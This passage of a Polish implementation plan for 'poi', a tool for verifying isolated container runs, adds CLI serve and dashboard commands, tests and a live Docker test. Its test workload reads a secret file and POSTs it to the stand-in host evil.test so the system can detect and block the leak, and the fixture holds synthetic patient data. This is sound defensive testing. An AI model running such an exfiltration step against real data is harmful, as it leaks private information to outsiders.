  const alerts = $("alerts");
  if (!("Notification" in window)) alerts.hidden = true;
  else if (Notification.permission === "granted") alerts.textContent = "Alerts on";
  alerts.addEventListener("click", async () => {
    if (await Notification.requestPermission() === "granted") alerts.textContent = "Alerts on";
  });
  drawSeal("pending", null);
  connect();
});
```

- [ ] **Step 4: Uruchom testy — oczekiwany PASS**

Run: `.venv/bin/pytest tests/test_dashboard_ui.py -v`
Expected: wszystkie testy PASS.

- [ ] **Step 5: Commit**

```bash
git add src/poi/dashboard_static/app.css src/poi/dashboard_static/app.js src/poi/dashboard_static/index.html tests/test_dashboard_ui.py
git commit -m "feat: dashboard UI — verdict seal, chain-of-custody tape, live feed, inspector

Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```


### Task 7: CLI: `poi serve` i `poi dashboard`

Komendy dla operatora i właściciela; szybki błąd przy złym tokenie lub URL (spec §7, §8).

**Files:**
- Modify: `src/poi/cli.py` (3 zamiany poniżej)
- Modify: `tests/test_cli.py` (dopisz na końcu)

**Interfaces:**
- Consumes: `make_server`, `new_token`, `declaration`, `Mirror`, `HttpSource`, `LocalSource`, `DashboardApp`, `make_dashboard_server`
- Produces: `cli._hostport(str)->(host, port)`, `cli.build_dashboard(args)->(server, mirror, url)`, `cmd_serve`, `cmd_dashboard` (kod 2 przy błędzie źródła).

- [ ] **Step 1: Napisz testy (najpierw muszą nie przechodzić)**

Dopisz na końcu `tests/test_cli.py`:

```python


def test_dashboard_rejects_wrong_token(tmp_path, key, capsys):
    import threading
    from poi.serve import make_server
    run = _run(tmp_path, key)
    srv = make_server(run, "right", port=0)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    (tmp_path / "tok").write_text("wrong\n")
    try:
        code = main(["dashboard", "--source", f"http://127.0.0.1:{srv.server_address[1]}",
                     "--token-file", str(tmp_path / "tok"), "--pubkey-file", str(run / "pubkey"),
                     "--mirror", str(tmp_path / "m"), "--listen", "127.0.0.1:0"])
    finally:
        srv.shutdown()
    assert code == 2 and "401" in capsys.readouterr().err


def test_build_dashboard_over_local_source(tmp_path, key):
    import argparse
    from poi.cli import build_dashboard
    run = _run(tmp_path, key)
    args = argparse.Namespace(source=str(run), token_file=None, pubkey=None, pubkey_file=str(run / "pubkey"),
                              data=None, fp_key=None, mirror=str(tmp_path / "m"), listen="127.0.0.1:0")
    srv, mirror, url = build_dashboard(args)
    try:
        assert url.startswith("http://127.0.0.1:") and "?key=" in url
        assert mirror.sync_once(wait=0) == 2
    finally:
        srv.server_close()
```

- [ ] **Step 2: Uruchom testy — oczekiwany FAIL**

Run: `.venv/bin/pytest tests/test_cli.py -v`
Expected: FAIL — `argparse` odrzuca nieznaną komendę `dashboard` (SystemExit 2) oraz `ImportError: cannot import name 'build_dashboard'`

- [ ] **Step 3: Implementacja**

W `src/poi/cli.py` zamień:

```python
"""Command line: poi keygen | fingerprint | run | resume | verify | report | clean."""
```

na:

```python
"""Command line: poi keygen | fingerprint | run | resume | verify | report | clean | serve | dashboard."""
```

W `src/poi/cli.py` zamień:

```python
def build_parser() -> argparse.ArgumentParser:
```

na:

```python
def _hostport(s: str) -> tuple[str, int]:
    host, _, port = s.rpartition(":")
    return host or "127.0.0.1", int(port)


def cmd_serve(args) -> int:
    from poi.serve import make_server, new_token
    tf = Path(args.token_file)
    if args.new_token:
        new_token(tf)
        print(f"new token written to {tf}")
    token = tf.read_text().strip()
    run = Path(args.run_dir)

    def runtime() -> dict:
        try:
            import docker
            from poi.runtime import RuntimeInfo
            from poi.runtime_info import declaration
            return declaration(docker.from_env(), RuntimeInfo.load(run).workload_id)
        except Exception:
            return {"status": "unknown"}

    host, port = _hostport(args.listen)
    srv = make_server(run, token, host, port, runtime)
    print(f"serving {run} on http://{host}:{srv.server_address[1]} (put TLS in front of it)")
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        pass
    return 0


def build_dashboard(args):
    """Returns (server, mirror, url) without blocking; raises SourceError on a bad source."""
    from poi.dashboard import DashboardApp, make_dashboard_server, new_session_key
    from poi.fingerprint import FingerprintSet
    from poi.mirror import Mirror
    from poi.source import HttpSource, LocalSource
    if args.source.startswith(("http://", "https://")):
        if not args.token_file:
            raise SystemExit("--token-file is required for an HTTP source")
        source = HttpSource(args.source, Path(args.token_file).read_text().strip())
    else:
        source = LocalSource(Path(args.source))
    source.policy()                                   # fail fast on a wrong URL or token
    pubkey = args.pubkey or Path(args.pubkey_file).read_text().strip()
    fps = None
    if args.data:
        policy_raw = source.policy()
        p = pol.parse(policy_raw)
        fps = FingerprintSet.from_dir(Path(args.data), Path(args.fp_key).read_bytes(), p.fingerprint_k, p.fingerprint_w)
    mirror = Mirror(Path(args.mirror), source, pubkey, fps, source_label=args.source)
    key = new_session_key()
    host, port = _hostport(args.listen)
    srv = make_dashboard_server(DashboardApp(mirror, args.source), key, host, port)
    return srv, mirror, f"http://{host}:{srv.server_address[1]}/?key={key}"


def cmd_dashboard(args) -> int:
    import threading
    from poi.source import SourceError
    try:
        srv, mirror, url = build_dashboard(args)
    except SourceError as e:
        print(f"cannot read the operator feed: {e}", file=sys.stderr)
        return 2
    stop = threading.Event()
    threading.Thread(target=mirror.run, args=(stop,), daemon=True).start()
    threading.Thread(target=mirror.run_runtime, args=(stop,), daemon=True).start()
    print(f"dashboard: {url}")
    if args.open:
        import webbrowser
        webbrowser.open(url)
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        pass
    finally:
        stop.set()
    return 0


def build_parser() -> argparse.ArgumentParser:
```

W `src/poi/cli.py` zamień:

```python
    s = sub.add_parser("clean", help="remove the workload container and internal network")
    s.add_argument("run_dir")
    s.set_defaults(fn=cmd_clean)
    return p
```

na:

```python
    s = sub.add_parser("clean", help="remove the workload container and internal network")
    s.add_argument("run_dir")
    s.set_defaults(fn=cmd_clean)

    s = sub.add_parser("serve", help="operator: read-only feed of a run for the data owner")
    s.add_argument("run_dir")
    s.add_argument("--token-file", required=True)
    s.add_argument("--new-token", action="store_true", help="generate a new token into --token-file")
    s.add_argument("--listen", default="127.0.0.1:8765")
    s.set_defaults(fn=cmd_serve)

    s = sub.add_parser("dashboard", help="data owner: verify a run live and show it in the browser")
    s.add_argument("--source", required=True, help="https://… (poi serve behind TLS) or a local run directory")
    s.add_argument("--token-file")
    s.add_argument("--pubkey")
    s.add_argument("--pubkey-file")
    s.add_argument("--mirror", required=True, help="local directory that keeps the verified copy")
    s.add_argument("--data")
    s.add_argument("--fp-key")
    s.add_argument("--listen", default="127.0.0.1:8780")
    s.add_argument("--open", action="store_true", help="open the dashboard in the default browser")
    s.set_defaults(fn=cmd_dashboard)
    return p
```

- [ ] **Step 4: Uruchom testy — oczekiwany PASS**

Run: `.venv/bin/pytest tests/test_cli.py -v`
Expected: wszystkie testy PASS.

- [ ] **Step 5: Commit**

```bash
git add src/poi/cli.py tests/test_cli.py
git commit -m "feat: poi serve and poi dashboard commands

Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```


### Task 8: E2E na żywo z Dockerem + README

Prawdziwy przebieg: `poi run` + `poi serve` + lustro po HTTP śledzone na żywo: najpierw 🟢, po próbie wycieku 🟠, po potwierdzeniu 🟢.

**Files:**
- Create: `tests/integration/workload_slow.py`
- Test: `tests/integration/test_dashboard_e2e.py` (marker `docker`)
- Modify: `README.md` (sekcja dashboardu przed „## Testy”)

**Interfaces:**
- Consumes: wszystko powyżej
- Produces: —

- [ ] **Step 1: Napisz testy (najpierw muszą nie przechodzić)**

Utwórz `tests/integration/workload_slow.py`:

```python
"""Dashboard e2e workload: a legitimate call, a pause, then an exfiltration attempt, then a pause."""
import json
import time
import urllib.error
import urllib.request

SECRET = open("/data/secret.txt").read()


def post(url, payload):
    req = urllib.request.Request(url, data=json.dumps(payload).encode(), method="POST",
                                 headers={"content-type": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status
    except urllib.error.HTTPError as e:
        return e.code


print("allowed", post("http://api.test/v1/score", {"model": "small", "count": 2}), flush=True)
time.sleep(6)
print("exfil", post("http://evil.test/collect", {"d": SECRET}), flush=True)
time.sleep(4)
```

Utwórz `tests/integration/test_dashboard_e2e.py`:

```python
"""Live end-to-end: poi run + poi serve + owner-side Mirror over HTTP. Run with: pytest -m docker"""
import threading
import time
from pathlib import Path

import pytest

docker = pytest.importorskip("docker")

from poi import daemon  # noqa: E402
from poi.assess import ATTENTION, VERIFIED  # noqa: E402
from poi.fingerprint import FingerprintSet  # noqa: E402
from poi.ledger import generate_key  # noqa: E402
from poi.mirror import Mirror  # noqa: E402
from poi.runtime import Runtime, build_proxy_image  # noqa: E402
from poi.serve import make_server  # noqa: E402
from poi.source import HttpSource  # noqa: E402

HERE = Path(__file__).parent
SECRET = (b"patient: Jan Kowalski, PESEL 85010112345, diagnosis: J45.0 asthma, "
          b"address: ul. Lipowa 7, 30-001 Krakow, phone +48 600 100 200")
pytestmark = pytest.mark.docker


@pytest.fixture(scope="module")
def client():
    try:
        c = docker.from_env()
        c.ping()
    except Exception:
        pytest.skip("Docker not available")
    build_proxy_image(c)
    c.images.pull("python:3.12-slim")
    return c


def test_dashboard_follows_a_live_run(client, tmp_path):
    data = tmp_path / "data"
    data.mkdir()
    (data / "secret.txt").write_bytes(SECRET)
    fp_key = b"f" * 32
    FingerprintSet.from_dir(data, fp_key).save(tmp_path / "fp.bin")
    pub = generate_key(tmp_path / "signing.key")
    run_dir = tmp_path / "run"
    holder = {}
    real_prepare = Runtime.prepare

    def prepare_with_upstream_and_feed(self, *a, **kw):
        info = real_prepare(self, *a, **kw)
        holder["api"] = client.containers.run(
            "python:3.12-slim", ["python", "/up.py"], detach=True, name=f"poi-{info.run_id}-api",
            volumes={str(HERE / "upstream.py"): {"bind": "/up.py", "mode": "ro"}})
        client.networks.get(info.ext_network).connect(holder["api"], aliases=["api.test"])
        srv = make_server(self.run_dir, "tok", port=0, poll=0.1)
        threading.Thread(target=srv.serve_forever, daemon=True).start()
        holder["srv"] = srv
        return info

    Runtime.prepare = prepare_with_upstream_and_feed
    runner = threading.Thread(target=lambda: holder.update(rt=daemon.start(daemon.RunSpec(
        run_dir, HERE / "policy.yaml", tmp_path / "signing.key", "python:3.12-slim",
        ["python", "/app/w.py"], (tmp_path / "fp.bin", fp_key),
        {str(HERE / "workload_slow.py"): "/app/w.py", str(data): "/data"}, max_ticks=60), client)))
    try:
        runner.start()
        deadline = time.monotonic() + 120
        while "srv" not in holder and time.monotonic() < deadline:
            time.sleep(0.2)
        source = HttpSource(f"http://127.0.0.1:{holder['srv'].server_address[1]}", "tok")
        fps = FingerprintSet.from_dir(data, fp_key)
        while not (run_dir / "ledger" / "000000.json").exists() and time.monotonic() < deadline:
            time.sleep(0.2)
        mirror = Mirror(tmp_path / "mirror", source, pub, fps, sleep=lambda s: None)
        levels = []
        while runner.is_alive() and time.monotonic() < deadline:
            mirror.sync_once(wait=1)
            levels.append(mirror.verdict().level)
        mirror.sync_once(wait=0)
    finally:
        Runtime.prepare = real_prepare
        runner.join(timeout=30)
        if "srv" in holder:
            holder["srv"].shutdown()
        if "api" in holder:
            holder["api"].remove(force=True)
        if "rt" in holder:
            holder["rt"].teardown(keep_workload=False)

    assert VERIFIED in levels, levels
    assert levels.index(VERIFIED) < levels.index(ATTENTION), levels
    assert mirror.verdict().level == ATTENTION and mirror.error is None
    seq = next(s for s, (v, _) in mirror.hits.items() if v == "block")
    assert mirror.ack(seq) and mirror.verdict().level == VERIFIED
```

- [ ] **Step 2: Uruchom testy — oczekiwany FAIL**

Run: `.venv/bin/pytest -m docker tests/integration/test_dashboard_e2e.py -v`
Expected: Test powinien PRZEJŚĆ od razu (implementacja kompletna). Jeśli nie — błąd w zadaniach 1–7: zdiagnozuj (superpowers:systematic-debugging), nie zmieniaj asercji.

- [ ] **Step 3: Implementacja**

W `README.md` zamień:

```markdown
## Testy
```

na:

````markdown
## Dashboard właściciela danych

Operator udostępnia przebieg tylko do odczytu (TLS zapewnia jego reverse proxy, np. Caddy):

```bash
poi serve run --token-file serve.token --new-token          # 127.0.0.1:8765, token do pliku 0600
```

Właściciel danych — na swojej maszynie, z kluczem publicznym operatora otrzymanym inną drogą:

```bash
poi dashboard --source https://operator.example/poi --token-file serve.token \
              --pubkey <hex od operatora> --mirror ~/poi/run-1 \
              --data ./moje_dane --fp-key fp.key --open
```

Dashboard weryfikuje każdy checkpoint lokalnie (kody 10–16), trzyma zweryfikowaną kopię w `--mirror`
(działa na niej `poi verify` / `poi report`) i pokazuje werdykt: **Verified** / **Needs attention** /
**Proof broken**. Stan kontenera (status, CPU, RAM) to deklaracja operatora — pokazywana, ale nigdy
nie wpływa na werdykt. Do podglądu lokalnego przebiegu wystarczy `--source ./run`.

## Testy
````

- [ ] **Step 4: Uruchom testy — oczekiwany PASS**

Run: `.venv/bin/pytest -v && .venv/bin/python -m pyflakes src tests`
Expected: wszystkie testy PASS.

- [ ] **Step 5: Commit**

```bash
git add README.md tests/integration/test_dashboard_e2e.py tests/integration/workload_slow.py
git commit -m "test: live dashboard e2e against real Docker; README

Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```


---

## Pokrycie specyfikacji

| Spec | Zadanie |
|---|---|
| §4 API operatora | 2 |
| §5.1 ChainVerifier | 1 |
| §5.2 lustro, §5.3 odciski | 4 |
| §6 alarmy | 3, 4 |
| §7 dashboard lokalny (API, SSE, klucz sesji, CSP) | 5 |
| §7 strona (EN, układ A + inspektor) | 6 |
| §8 obsługa błędów | 4, 7 |
| §9 testy (w tym e2e Docker) | 1–8 |
